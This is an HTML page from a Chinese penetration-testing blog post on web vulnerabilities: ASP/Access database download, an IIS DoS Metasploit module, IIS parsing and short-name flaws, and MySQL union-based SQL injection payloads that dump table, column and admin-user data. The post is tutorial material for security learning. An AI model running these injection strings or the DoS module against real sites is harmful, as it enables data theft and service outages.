@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>渗透测试--WEB攻防(上) | ink&#39;s blog</title>
+  <meta name="description" content="此篇主要写一些常规漏洞方面的知识，从不同的语言特性去讲解 ASP大部分ASP程序与ACCESS数据库搭建，但ACCESS无需连接，都在脚本文件中定义配置好数据库路径即用，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认的，当攻击者知道完整路径，就可以远程下载后解密数据，数据库在网站目录里 比如我们知道了一个网站采用默认搭建后数据库的地址，直接访问就可以下载数据库文件，如： 1xxx">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试--WEB攻防(上)">
+<meta property="og:url" content="https://ink-scholar.github.io/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="此篇主要写一些常规漏洞方面的知识，从不同的语言特性去讲解 ASP大部分ASP程序与ACCESS数据库搭建，但ACCESS无需连接，都在脚本文件中定义配置好数据库路径即用，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认的，当攻击者知道完整路径，就可以远程下载后解密数据，数据库在网站目录里 比如我们知道了一个网站采用默认搭建后数据库的地址，直接访问就可以下载数据库文件，如： 1xxx">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ink-scholar.github.io/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/image-20240218214113548.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/i-beta/1853528/201911/1853528-20191106132336991-1666925658.png">
+<meta property="article:published_time" content="2024-02-17T08:41:39.660Z">
+<meta property="article:modified_time" content="2024-02-19T14:39:00.377Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="攻防">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ink-scholar.github.io/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/image-20240218214113548.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://ink-scholar.github.io/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/ink-scholar" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">ink</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">就职于奇安信的00后安全研究员</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> NanJing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav menu-highlight">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ink-scholar" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>万般皆下品   唯有读书高</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SRC/">SRC</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">6</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/" rel="tag">WEB</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/src/" rel="tag">src</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="tag">信息搜集</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BC%80%E5%8F%91/" rel="tag">开发</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2/" rel="tag">攻防</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a><span class="tag-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/WEB/" style="font-size: 14px;">WEB</a> <a href="/tags/src/" style="font-size: 13px;">src</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 13px;">代码审计</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" style="font-size: 13px;">信息搜集</a> <a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 13px;">基础</a> <a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 13.5px;">开发</a> <a href="/tags/%E6%94%BB%E9%98%B2/" style="font-size: 13.5px;">攻防</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 13.5px;">漏洞</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2024/02/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8B)/" class="title">渗透测试--WEB攻防(下)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-02-19T14:41:45.562Z" itemprop="datePublished">2024-02-19</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/" class="title">渗透测试--WEB攻防(上)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-02-17T08:41:39.660Z" itemprop="datePublished">2024-02-17</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/" class="title">渗透测试--安全开发(下)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-02-07T05:21:02.979Z" itemprop="datePublished">2024-02-07</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8A)/" class="title">渗透测试--安全开发(上)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-22T13:55:33.707Z" itemprop="datePublished">2024-01-22</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="title">渗透测试--信息搜集</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-02T15:55:32.430Z" itemprop="datePublished">2024-01-02</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+  <aside class="sidebar sidebar-toc collapse   in  " id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">Catalogue</h3>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ASP"><span class="toc-number">1.</span> <span class="toc-text">ASP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">中间件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2015-1635"><span class="toc-number">1.1.1.</span> <span class="toc-text">CVE-2015-1635</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS%E7%9F%AD%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.2.</span> <span class="toc-text">IIS短文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-number">1.1.3.</span> <span class="toc-text">IIS文件解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS%E5%86%99%E5%85%A5"><span class="toc-number">1.1.4.</span> <span class="toc-text">IIS写入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACCESS%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">ACCESS数据库注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP"><span class="toc-number">2.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">Mysql数据库注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%8E%B7%E5%8F%96"><span class="toc-number">2.1.1.</span> <span class="toc-text">数据获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">跨库注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">2.1.3.</span> <span class="toc-text">文件读写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%AF%B7%E6%B1%82"><span class="toc-number">2.1.4.</span> <span class="toc-text">数据请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5"><span class="toc-number">2.1.5.</span> <span class="toc-text">增删改查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.1.6.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.7.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.8.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.9.</span> <span class="toc-text">带外注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.2.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E6%80%81"><span class="toc-number">2.2.1.</span> <span class="toc-text">原生态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E7%B1%BB"><span class="toc-number">2.2.2.</span> <span class="toc-text">拓展类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E7%B1%BB"><span class="toc-number">2.2.3.</span> <span class="toc-text">安全架构类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.3.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.3.1.</span> <span class="toc-text">伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">2.3.2.</span> <span class="toc-text">日志包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SESSION%E5%8C%85%E5%90%AB"><span class="toc-number">2.3.3.</span> <span class="toc-text">SESSION包含</span></a></li></ol></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-渗透测试--WEB攻防(上)" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      渗透测试--WEB攻防(上)
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/" class="article-date">
+	  <time datetime="2024-02-17T08:41:39.660Z" itemprop="datePublished">2024-02-17</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/WEB/" rel="tag">WEB</a>, <a class="article-tag-link-link" href="/tags/%E6%94%BB%E9%98%B2/" rel="tag">攻防</a>, <a class="article-tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <p><em><strong>此篇主要写一些常规漏洞方面的知识，从不同的语言特性去讲解</strong></em></p>
+<h1 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h1><p>大部分ASP程序与ACCESS数据库搭建，但ACCESS无需连接，都在脚本文件中定义配置好数据库路径即用，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认的，当攻击者知道完整路径，就可以远程下载后解密数据，数据库在网站目录里</p>
+<p>比如我们知道了一个网站采用默认搭建后数据库的地址，直接访问就可以下载数据库文件，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxxxx/database/%23data.mdb</span><br></pre></td></tr></table></figure>
+
+<p>%23通过url编码后为#</p>
+<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><h3 id="CVE-2015-1635"><a href="#CVE-2015-1635" class="headerlink" title="CVE-2015-1635"></a>CVE-2015-1635</h3><p>HTTP.SYS漏洞，当它未正确分析经特殊设计的HTTP请求时会导致此漏洞，简单点就是蓝屏打崩，影响系统版本一直到Windows Server 2012 R2，操作系统需要安装IIS 6.0以上，漏洞复现通过msf实现，使用以下模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/dos/http/ms15_034_ulonglongadd</span><br></pre></td></tr></table></figure>
+
+<h3 id="IIS短文件"><a href="#IIS短文件" class="headerlink" title="IIS短文件"></a>IIS短文件</h3><p>实际是由HTTP请求中旧DOS 8.3名称约定（SFN）的代字符（波浪号）引起的。允许远程攻击者在web根目录下公开文件和文件夹名称（不应该被访问）从而获取有关应用程序基础结构的信息。成因是为了兼容16位MS-DOS程序，Windows为文件名较长的文件和文件夹生成了对应的windows 8.3短文件名。在windows下可以通过 dir &#x2F;x 查看对应的短文件名</p>
+<p>利用工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/irsdl/IIS-ShortName-Scanner</span><br><span class="line">https://github.com/lijiejie/IIS_shortname_Scanner</span><br></pre></td></tr></table></figure>
+
+<h3 id="IIS文件解析"><a href="#IIS文件解析" class="headerlink" title="IIS文件解析"></a>IIS文件解析</h3><p>IIS 6 解析漏洞：</p>
+<p>1、默认会将 <strong>*.asp;.jpg</strong> 此种格式的文件名，当成Asp解析</p>
+<p>2、默认会将 <strong>*.asp&#x2F;</strong> 目录下的所有文件当成Asp解析</p>
+<p>IIS 7.x 解析漏洞：</p>
+<p>在一个文件路径（**&#x2F;xx.jpg**）后面加上 <strong>&#x2F;xx.php</strong> 会将 <strong>&#x2F;xx.jpg&#x2F;xx.php</strong> 解析为php文件</p>
+<h3 id="IIS写入"><a href="#IIS写入" class="headerlink" title="IIS写入"></a>IIS写入</h3><p>这个利用条件非常苛刻，具体可以参考： <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2050105">https://cloud.tencent.com/developer/article/2050105</a></p>
+<p>IIS&lt;&#x3D;6.0，目录权限开启写入，开启WebDAV，设置为允许，可以通过PUT请求直接写入</p>
+<h2 id="ACCESS数据库注入"><a href="#ACCESS数据库注入" class="headerlink" title="ACCESS数据库注入"></a>ACCESS数据库注入</h2><p>ACCESS数据库无管理账号密码，顶级架构为表名列名数据，所以在注入时一般采用字典猜解表和列再获取数据，access数据库目前已经很少了，直接使用sqlmap跑吧，具体使用方法网上太多了，自行查阅</p>
+<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="Mysql数据库注入"><a href="#Mysql数据库注入" class="headerlink" title="Mysql数据库注入"></a>Mysql数据库注入</h2><p>服务器安装 MYSQL 数据库，搭建多个站点，数据库集中存储 MYSQL 数据库中管理，可以都使用 root 用户管理，也可以创建多个用户进行每个网站对应的数据库管理，也就是说，root用户可以看到这个连接里面所有的数据库，而其他用户只能看到自己创建的数据库和默认自带的数据库</p>
+<h3 id="数据获取"><a href="#数据获取" class="headerlink" title="数据获取"></a>数据获取</h3><p>1、数据库版本-看是否符合 information_schema 查询：<strong>version()</strong><br>2、数据库用户-看是否符合 ROOT 型注入攻击：<strong>user()</strong><br>3、当前操作系统-看是否支持大小写或文件路径选择：**@@version_compile_os**<br>4、数据库名字-为后期猜解指定数据库下的表，列做准备：<strong>database()</strong></p>
+<p>MYSQL5.0 以上版本：自带数据库 <strong>information_schema</strong><br>information_schema：存储数据库下的数据库名及表名，列名信息的数据库<br>information_schema.schemata：记录数据库名信息的表<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息的表<br>schema_name：information_schema.schemata 记录数据库名信息的字段<br>table_schema：information_schema.tables 记录数据库名的字段<br>table_name：information_schema.tables 记录表名的字段<br>column_name：information_schema.columns 记录列名的字段</p>
+<p>简单的sql注入的语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">6</span> # 通过<span class="keyword">order</span> <span class="keyword">by</span> 来看有几个字段，这里<span class="number">6</span>正常<span class="number">7</span>错误，所以当前表中有六个字段</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> # 通过输出<span class="number">1</span><span class="number">-6</span>来看那几个位置的值可以被回显在页面上</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="keyword">user</span>(),<span class="number">6</span> #这里<span class="number">4</span>和<span class="number">5</span>这两个位置可以正常回显，查看当前数据库名和用户名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version(),@<span class="variable">@version_compile_os</span>,<span class="number">6</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,group_concat(table_name),<span class="number">6</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;demo01&#x27;</span></span><br><span class="line">#查看demo01这个数据库中的所有表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,group_concat(column_name),<span class="number">6</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;demo01&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">#查看demo01数据库中admin表的所有字段名</span><br><span class="line">id <span class="operator">=</span> <span class="number">1.111</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,username,<span class="number">6</span> <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>; # 查看admin表中username字段第一个值，多个值的话通过limit来控制，比如查看第二个值，limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="跨库注入"><a href="#跨库注入" class="headerlink" title="跨库注入"></a>跨库注入</h3><p>通过B网站的注入点获取A网站的数据，前提需要是root用户权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,group_concat(schema_name),<span class="number">6</span> <span class="keyword">from</span> information_schema.schemata;# 查看所有数据库名</span><br></pre></td></tr></table></figure>
+
